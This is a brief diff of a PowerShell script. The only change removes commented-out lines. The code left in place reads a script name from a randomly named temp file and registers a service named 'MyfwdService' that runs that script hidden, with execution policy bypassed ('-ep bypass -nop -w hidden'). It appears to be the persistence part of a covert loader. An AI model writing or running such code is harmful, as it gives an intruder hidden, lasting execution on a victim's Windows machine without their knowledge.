@@ -88,10 +88,6 @@ while ($true) {
         $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
         $fwdName = $fwdName.Trim()
         if($null -ne $fwdName -and $fwdName -ne ""){
-            # $it = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
-            # if($it){
-            #     $fwdPath = $it.$propertyName
-            # }
             $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
             $arg = "-ep bypass -nop -w hidden $fwdPath"
             & $exe set "MyfwdService" AppParameters $arg
